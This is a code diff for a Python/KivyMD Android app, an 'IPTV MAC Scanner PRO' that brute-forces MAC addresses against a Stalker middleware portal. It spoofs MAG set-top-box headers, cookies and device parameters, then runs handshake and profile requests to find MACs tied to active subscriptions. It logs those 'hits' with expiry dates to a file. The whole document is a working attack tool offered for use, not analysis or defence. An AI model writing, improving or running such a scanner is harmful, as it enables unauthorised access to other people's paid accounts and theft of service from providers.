@@ -1,9 +1,7 @@
 """
-Professional IPTV MAC Scanner PRO - High Performance & Fixed UI Version
-- Fixed Text overlap by stripping hardcoded textfield heights.
-- Fixed Broken character glyph before STATUS text.
-- Optimized Batch UI Updates & Log Limiting to Prevent Freezing on Pydroid.
-Compatible with: KivyMD 1.2.0 + Kivy 2.3.x (Pydroid3 / Android)
+Professional Stalker Middleware MAC Scanner PRO (Flash Engine v4.6)
+Fully Optimized for: KivyMD 1.2.0 + Kivy 2.3.x (Pydroid3 / Android)
+Fixed: Dynamic Hits History rendering in the History Panel.
 """
 
 from kivymd.app import MDApp
@@ -12,7 +10,7 @@ from kivymd.uix.bottomnavigation import MDBottomNavigation, MDBottomNavigationIt
 from kivymd.uix.boxlayout import MDBoxLayout
 from kivymd.uix.card import MDCard
 from kivymd.uix.label import MDLabel
-from kivymd.uix.button import MDRaisedButton
+from kivymd.uix.button import MDRaisedButton, MDIconButton
 from kivymd.uix.textfield import MDTextField
 from kivymd.uix.progressbar import MDProgressBar
 from kivymd.uix.scrollview import MDScrollView
@@ -27,16 +25,18 @@ from kivy.utils import get_color_from_hex
 
 import threading
 import requests
-import random
 import time
 import datetime
+import re
 import os
 from queue import Queue
 
-# تعطيل تحذيرات الحماية لطلبات HTTP غير المشفرة أو الشهادات الذاتية
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ─────────────────────────────────────────────
+#  KV Layout Design
+# ─────────────────────────────────────────────
 KV = """
 #:import dp kivy.metrics.dp
 #:import get_color_from_hex kivy.utils.get_color_from_hex
@@ -65,6 +65,21 @@ KV = """
         theme_text_color: "Secondary"
 
 
+<LogLine>:
+    size_hint_y: None
+    height: self.minimum_height
+    padding: [dp(4), dp(1)]
+
+    MDLabel:
+        text: root.text
+        markup: True
+        font_style: "Body2"
+        size_hint_y: None
+        height: self.texture_size[1]
+        theme_text_color: "Custom"
+        text_color: root.line_color
+
+
 <DashboardScreen>:
     name: "dashboard"
 
@@ -72,7 +87,7 @@ KV = """
         orientation: "vertical"
 
         MDTopAppBar:
-            title: "IPTV MAC Scanner PRO v4"
+            title: "IPTV MAC Scanner PRO v4.6"
             md_bg_color: app.theme_cls.primary_color
 
         MDScrollView:
@@ -85,7 +100,6 @@ KV = """
                 size_hint_y: None
                 height: self.minimum_height
 
-                # ── الإحصائيات ──
                 MDBoxLayout:
                     spacing: dp(10)
                     size_hint_y: None
@@ -106,7 +120,6 @@ KV = """
                         value: root.errors
                         accent_color: get_color_from_hex("#FF5252")
 
-                # ── الإعدادات المصححة والمحمية من التداخل ──
                 MDCard:
                     orientation: "vertical"
                     padding: dp(14)
@@ -118,7 +131,7 @@ KV = """
                     md_bg_color: app.theme_cls.bg_dark
 
                     MDLabel:
-                        text: "TARGET CONFIGURATION"
+                        text: "STALKER PROTOCOL SETUP"
                         bold: True
                         size_hint_y: None
                         height: dp(25)
@@ -128,7 +141,29 @@ KV = """
                         hint_text: "Portal URL"
                         text: "http://fortv.cc:8080/"
                         mode: "rectangle"
-                        # تم ترك الارتفاع للتكيف التلقائي لمنع تداخل الحروف ونصوص الـ Hint
+
+                    MDTextField:
+                        id: mac_prefix
+                        hint_text: "MAC Prefix"
+                        text: "00:1A:79"
+                        mode: "rectangle"
+
+                    MDBoxLayout:
+                        spacing: dp(10)
+                        size_hint_y: None
+                        height: self.minimum_height
+
+                        MDTextField:
+                            id: hex_start
+                            hint_text: "Hex Start"
+                            text: "000000"
+                            mode: "rectangle"
+
+                        MDTextField:
+                            id: hex_end
+                            hint_text: "Hex End"
+                            text: "000FFF"
+                            mode: "rectangle"
 
                     MDBoxLayout:
                         spacing: dp(10)
@@ -138,18 +173,17 @@ KV = """
                         MDTextField:
                             id: threads
                             hint_text: "THREADS"
-                            text: "25"
+                            text: "20"
                             mode: "rectangle"
                             input_filter: "int"
 
                         MDTextField:
                             id: timeout
                             hint_text: "TIMEOUT"
-                            text: "7"
+                            text: "4.0"
                             mode: "rectangle"
                             input_filter: "float"
 
-                # ── شريط التقدم والحالة ──
                 MDCard:
                     orientation: "vertical"
                     padding: dp(12)
@@ -175,7 +209,6 @@ KV = """
                         halign: "right"
                         font_style: "Caption"
 
-                # ── أزرار التحكم ──
                 MDBoxLayout:
                     spacing: dp(10)
                     size_hint_y: None
@@ -183,45 +216,50 @@ KV = """
 
                     MDRaisedButton:
                         id: btn_start
-                        text: "START"
+                        text: "START ENGINE"
                         md_bg_color: get_color_from_hex("#00897B")
                         on_release: root.start_scan()
 
                     MDRaisedButton:
                         id: btn_stop
-                        text: "STOP"
+                        text: "STOP ENGINE"
                         md_bg_color: get_color_from_hex("#B71C1C")
-                        on_release: root.stop_scan()
+                        on_release: root.on_stop_pressed()
                         disabled: True
 
                     MDRaisedButton:
-                        text: "CLEAR"
+                        text: "CLEAR LOGS"
                         md_bg_color: get_color_from_hex("#5D6266")
                         on_release: root.clear_logs()
 
-                # ── السجل الحي ──
                 MDCard:
                     orientation: "vertical"
                     radius: [14]
                     padding: dp(8)
                     md_bg_color: get_color_from_hex("#0D1117")
                     size_hint_y: None
-                    height: dp(260)
+                    height: dp(220)
 
-                    MDLabel:
-                        text: "LIVE LOG"
-                        bold: True
+                    MDBoxLayout:
+                        orientation: "horizontal"
                         size_hint_y: None
-                        height: dp(25)
-                        theme_text_color: "Custom"
-                        text_color: get_color_from_hex("#8B949E")
+                        height: dp(26)
+
+                        MDLabel:
+                            text: "STALKER LIVE CONSOLE LOG"
+                            bold: True
+                            theme_text_color: "Custom"
+                            text_color: get_color_from_hex("#8B949E")
 
                     MDScrollView:
                         id: log_scroll
-                        MDList:
-                            id: logs_list
+                        do_scroll_x: False
+                        MDBoxLayout:
+                            id: log_container
+                            orientation: "vertical"
                             size_hint_y: None
                             height: self.minimum_height
+                            spacing: dp(1)
 
 
 <SettingsScreen>:
@@ -231,33 +269,43 @@ KV = """
         orientation: "vertical"
 
         MDTopAppBar:
-            title: "Hits Dashboard"
+            title: "Captured Active HITS"
             md_bg_color: app.theme_cls.primary_color
+            right_action_items: [["refresh", lambda x: root.load_hits_history()], ["delete-sweep", lambda x: root.clear_hits_file()]]
 
-        MDLabel:
-            text: "Saved Hits Panel\\nCheck 'hits.txt' in your storage"
-            halign: "center"
-            theme_text_color: "Secondary"
+        MDScrollView:
+            do_scroll_x: False
+            MDList:
+                id: hits_list_container
+                padding: dp(10)
+                spacing: dp(5)
 """
 
+# ─────────────────────────────────────────────
+#  Widget Helper Classes
+# ─────────────────────────────────────────────
 class StatCard(MDCard):
     title = StringProperty("")
     value = StringProperty("0")
     accent_color = ListProperty([1, 1, 1, 1])
 
+class LogLine(MDBoxLayout):
+    text = StringProperty("")
+    line_color = ListProperty([0.8, 0.8, 0.8, 1])
+
+# ─────────────────────────────────────────────
+#  Main Dashboard Screen Logic
+# ─────────────────────────────────────────────
 class DashboardScreen(MDScreen):
     total_requests = StringProperty("0")
     success_hits = StringProperty("0")
     errors = StringProperty("0")
     progress = NumericProperty(0)
     progress_text = StringProperty("0 / 0 (0%)")
-    status = StringProperty("* STATUS: IDLE") # تم تغيير الرمز الغريب هنا ليعمل بسلاسة
+    status = StringProperty("* STATUS: READY")
     running = BooleanProperty(False)
 
-    DEFAULT_PREFIX = "00:1A:79"
-    HEX_START = 0x000000
-    HEX_END = 0xFFFFFF
-    MAX_LOG_ITEMS = 50 
+    MAX_LOG_ITEMS = 20
 
     def start_scan(self):
         if self.running:
@@ -265,118 +313,166 @@ class DashboardScreen(MDScreen):
 
         base_url = self.ids.target_url.text.strip()
         if not base_url:
-            self.status = "[!] STATUS: URL EMPTY"
+            self.status = "[!] STATUS: URL IS REQUIRED"
             return
 
+        try:
+            self.start_hex = int(self.ids.hex_start.text, 16)
+            self.end_hex = int(self.ids.hex_end.text, 16)
+            self._batch_size = max(self.end_hex - self.start_hex + 1, 1)
+        except ValueError:
+            self.start_hex = 0
+            self.end_hex = 1000
+            self._batch_size = 1000
+
         self.running = True
-        self.status = "[>] STATUS: RUNNING" # رمز سهم واضح ومتوافق مع أندرويد
+        self.status = "[>] STATUS: ENGINE RUNNING"
         self.ids.btn_start.disabled = True
         self.ids.btn_stop.disabled = False
-        self.ids.logs_list.clear_widgets()
+        self.ids.log_container.clear_widgets()
 
         self.total = 0
         self.hits = 0
         self.errors_count = 0
-        self._tested_values = set()
-        
+
+        self.thread_count = int(self.ids.threads.text or 20)
+        self.timeout_val = float(self.ids.timeout.text or 4.0)
+
         self.ui_queue = Queue()
+        Clock.schedule_interval(self.consume_ui_queue, 0.5)
 
-        self.batch_size = max(self.HEX_END - self.HEX_START, 1)
-        self.thread_count = int(self.ids.threads.text or 25) # تم تعديل القيمة الافتراضية إلى 25 خيط لسرعة قصوى
-        self.timeout_val = float(self.ids.timeout.text or 7.0)
+        self.add_log_to_ui("Core", "Isolated Network Core Initialized Safely.", "info")
+        threading.Thread(target=self.run_scanner_engine, args=(base_url,), daemon=True).start()
 
-        Clock.schedule_interval(self.consume_ui_queue, 0.4)
-
-        threading.Thread(target=self.run_scanner, args=(base_url,), daemon=True).start()
-
-    def stop_scan(self):
+    def on_stop_pressed(self):
         self.running = False
         self.status = "[-] STATUS: STOPPED"
         self.ids.btn_start.disabled = False
         self.ids.btn_stop.disabled = True
         Clock.unschedule(self.consume_ui_queue)
+        self.add_log_to_ui("Core", "Engine Suspended by User Request.", "warn")
 
-    def run_scanner(self, base_url):
+    def run_scanner_engine(self, base_url):
         portal = f"{base_url if base_url.endswith('/') else base_url + '/'}portal.php"
         
+        from urllib.parse import urlparse
+        parsed_url = urlparse(base_url)
+        host_header = parsed_url.netloc
+
         headers = {
-            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250',
-            'X-User-Agent': 'model=MAG250;ver=0;features=6',
-            'Referer': base_url
+            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+            'X-User-Agent': 'Model: MAG270; Link: WiFi',
+            'Host': host_header,
+            'Connection': 'Keep-Alive',
+            'Accept-Encoding': 'gzip'
         }
 
         session = requests.Session()
-        
-        try:
-            self.ui_queue.put(("LOG", ("System", "Initiating Handshake...")))
-            session.get(f"{portal}?type=stb&action=handshake", headers=headers, timeout=self.timeout_val, verify=False)
-            self.ui_queue.put(("LOG", ("System", "Handshake Established Successfully!")))
-        except Exception as e:
-            err_msg = str(e)
-            self.ui_queue.put(("LOG", ("Error", f"Handshake Failed: {err_msg}")))
-            Clock.schedule_once(lambda dt: self.stop_scan())
-            return
 
         from concurrent.futures import ThreadPoolExecutor
         with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
-            while self.running and self.total < self.batch_size:
-                val = random.randint(self.HEX_START, self.HEX_END)
-                if val in self._tested_values:
-                    continue
-                self._tested_values.add(val)
+            current_val = self.start_hex
+            while self.running and current_val <= self.end_hex:
+                mac = self.build_mac(current_val)
+                executor.submit(self.check_single_mag_flow, session, portal, mac, headers)
+                current_val += 1
+                time.sleep(0.015)
 
-                mac = self.build_mac(val)
-                executor.submit(self.check_mac, session, portal, mac, headers)
-                time.sleep(0.01) # تقليل المهلة الزمنية لرفع كفاءة سحب الخيوط
-
-    def check_mac(self, session, portal, mac, headers):
+    def check_single_mag_flow(self, session, portal, mac, headers):
         if not self.running:
             return
         
+        cookies = {
+            'mac': mac,
+            'mac_w': mac,
+            'timezone': 'Africa/Tunis',
+            'adid': '5679d1a8d478c7d0c362e35c51c194bf',
+            'stb_lang': 'en'
+        }
+        
         try:
-            auth_url = f"{portal}?type=itv&action=do_auth"
-            res = session.get(auth_url, cookies={'mac': mac}, headers=headers, timeout=self.timeout_val, verify=False)
+            handshake_url = f"{portal}?type=stb&action=handshake&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a"
+            res1 = session.get(handshake_url, cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
             
-            if "token" in res.text.lower() and len(res.text) > 20:
-                profile_url = f"{portal}?type=stb&action=get_profile"
-                prof = session.get(profile_url, cookies={'mac': mac}, headers=headers, timeout=self.timeout_val, verify=False)
+            response_text = res1.text.lower()
+            
+            if '"token":' in response_text or '"js":' in response_text:
+                timestamp = str(int(time.time()))
+                profile_params = {
+                    'type': 'stb',
+                    'action': 'get_profile',
+                    'hd': '1',
+                    'ver': 'ImageDescription: 0.2.18-r23-250; ImageDate: Thu Sep 13 11:31:16 EEST 2018; PORTAL version: 5.3.0; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c',
+                    'num_banks': '2',
+                    'sn': '0000000000000',
+                    'stb_type': 'MAG250',
+                    'client_type': 'STB',
+                    'image_version': '218',
+                    'video_out': 'hdmi',
+                    'device_id': '',
+                    'device_id2': '',
+                    'signature': '',
+                    'auth_second_step': '1',
+                    'hw_version': '1.7-BD-00',
+                    'not_valid_token': '0',
+                    'metrics': '',
+                    'hw_version_2': '631be47f51991ebd34b22b70bdba6cf9bc904580',
+                    'timestamp': timestamp,
+                    'api_signature': '262',
+                    'prehash': '',
+                    'JsHttpRequest': '1-xml'
+                }
                 
-                if "expiry" in prof.text or "parent_password" in prof.text:
-                    self.ui_queue.put(("DATA", (mac, "HIT")))
+                res2 = session.get(portal, params=profile_params, cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
+                
+                if res2.status_code == 200 and ("parent_password" in res2.text.lower() or "expiry" in res2.text.lower()):
+                    channels_url = f"{portal}?type=itv&action=get_all_channels"
+                    res3 = session.get(channels_url, cookies=cookies, headers=headers, timeout=self.timeout_val, verify=False)
+                    
+                    expiry = "Active Account"
+                    match = re.search(r'"expiry"\s*:\s*"([^"]+)"', res2.text, re.IGNORECASE)
+                    if match:
+                        expiry = match.group(1)
+                        
+                    if "data" in res3.text.lower() or res3.status_code == 200:
+                        self.ui_queue.put(("DATA", (mac, "HIT", f"Valid IPTV | Exp: {expiry}")))
+                    else:
+                        self.ui_queue.put(("DATA", (mac, "HIT", f"Authenticated (Empty Core) | Exp: {expiry}")))
                 else:
-                    self.ui_queue.put(("DATA", (mac, "MISS")))
+                    self.ui_queue.put(("DATA", (mac, "MISS", "")))
             else:
-                self.ui_queue.put(("DATA", (mac, "MISS")))
+                self.ui_queue.put(("DATA", (mac, "MISS", "")))
+                
         except:
-            self.ui_queue.put(("DATA", (mac, "ERROR")))
+            self.ui_queue.put(("DATA", (mac, "ERROR", "")))
 
     def consume_ui_queue(self, dt):
+        if not self.running:
+            return
+            
         has_updates = False
-        
         while not self.ui_queue.empty():
             q_type, q_data = self.ui_queue.get()
             
-            if q_type == "LOG":
-                tag, msg = q_data
-                self.add_log(tag, msg)
-            
-            elif q_type == "DATA":
-                mac, level = q_data
+            if q_type == "DATA":
+                mac, level, extra = q_data
                 self.total += 1
                 
                 if level == "HIT":
                     self.hits += 1
-                    self.add_log("HIT", mac)
+                    self.add_log_to_ui("HIT", f"{mac} -> {extra}", "success")
                     try:
                         with open("hits.txt", "a") as f:
-                            f.write(f"HIT: {mac} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                            f.write(f"HIT: {mac} | {extra} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     except:
                         pass
                 elif level == "ERROR":
                     self.errors_count += 1
-                    self.add_log("ERR", mac)
+                    if self.total % 6 == 0: 
+                        self.add_log_to_ui("ERR", "Gateway Timeout / Socket Refused", "error")
                 else:
-                    self.add_log("TRY", mac)
+                    if self.total % 10 == 0:
+                        self.add_log_to_ui("TRY", mac, "dim")
                     
                 has_updates = True
 
@@ -385,31 +481,85 @@ class DashboardScreen(MDScreen):
             self.success_hits = str(self.hits)
             self.errors = str(self.errors_count)
             
-            pct = min(int((self.total / self.batch_size) * 100), 100)
+            pct = min(int((self.total / self._batch_size) * 100), 100)
             self.progress = pct
-            self.progress_text = f"{self.total} / {self.batch_size} ({pct}%)"
+            self.progress_text = f"{self.total} / {self._batch_size} ({pct}%)"
+            
+            if self.total >= self._batch_size:
+                self.on_stop_pressed()
 
     def build_mac(self, value):
         suffix = f"{value:06X}"
-        return ":".join([self.DEFAULT_PREFIX] + [suffix[i:i+2] for i in range(0, 6, 2)])
+        prefix = self.ids.mac_prefix.text.strip()
+        return ":".join([prefix] + [suffix[i:i+2] for i in range(0, 6, 2)])
 
-    def add_log(self, tag, message):
-        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
-        logs_list = self.ids.logs_list
+    COLOR_MAP = {
+        "success": get_color_from_hex("#00E676"),
+        "error":   get_color_from_hex("#FF5252"),
+        "warn":    get_color_from_hex("#FFD740"),
+        "info":    get_color_from_hex("#82AAFF"),
+        "dim":     get_color_from_hex("#4F5661"),
+    }
+
+    def add_log_to_ui(self, tag, message, level="info"):
+        color = self.COLOR_MAP.get(level, self.COLOR_MAP["info"])
+        ts = datetime.datetime.now().strftime("%H:%M:%S")
         
-        logs_list.add_widget(OneLineListItem(text=f"[{timestamp}] {tag} | {message}"))
+        line = LogLine()
+        line.text = f"[color=#4F5661]{ts}[/color]  [{tag}] | {message}"
+        line.line_color = color
         
-        if len(logs_list.children) > self.MAX_LOG_ITEMS:
-            logs_list.remove_widget(logs_list.children[-1])
+        self.ids.log_container.add_widget(line)
+        
+        if len(self.ids.log_container.children) > self.MAX_LOG_ITEMS:
+            self.ids.log_container.remove_widget(self.ids.log_container.children[-1])
             
-        setattr(self.ids.log_scroll, "scroll_y", 0)
+        Clock.schedule_once(lambda dt: setattr(self.ids.log_scroll, "scroll_y", 0), 0.01)
 
     def clear_logs(self):
-        self.ids.logs_list.clear_widgets()
+        self.ids.log_container.clear_widgets()
 
 
+# ─────────────────────────────────────────────
+#  Settings / History Screen Logic (تحديث ديناميكي كامل للـ HITS)
+# ─────────────────────────────────────────────
 class SettingsScreen(MDScreen):
-    pass
+    def on_enter(self):
+        # يتم استدعاء الدالة تلقائياً وتحديث الواجهة بمجرد ضغط المستخدم على تبويب History
+        self.load_hits_history()
+
+    def load_hits_history(self):
+        container = self.ids.hits_list_container
+        container.clear_widgets()
+
+        if not os.path.exists("hits.txt"):
+            container.add_widget(OneLineListItem(text="No HITS captured yet."))
+            return
+
+        try:
+            with open("hits.txt", "r") as f:
+                lines = f.readlines()
+            
+            if not lines:
+                container.add_widget(OneLineListItem(text="No HITS captured yet."))
+                return
+
+            # عرض الحسابات الناجحة من الأحدث إلى الأقدم لقراءة مريحة
+            for line in reversed(lines):
+                if line.strip():
+                    item = OneLineListItem(text=line.strip())
+                    container.add_widget(item)
+        except Exception as e:
+            container.add_widget(OneLineListItem(text=f"Error reading history: {str(e)}"))
+
+    def clear_hits_file(self):
+        # دالة لمسح ملف hits.txt لتنظيف مساحة التخزين عند الحاجة
+        try:
+            if os.path.exists("hits.txt"):
+                os.remove("hits.txt")
+            self.load_hits_history()
+        except:
+            pass
 
 
 class MainApp(MDApp):
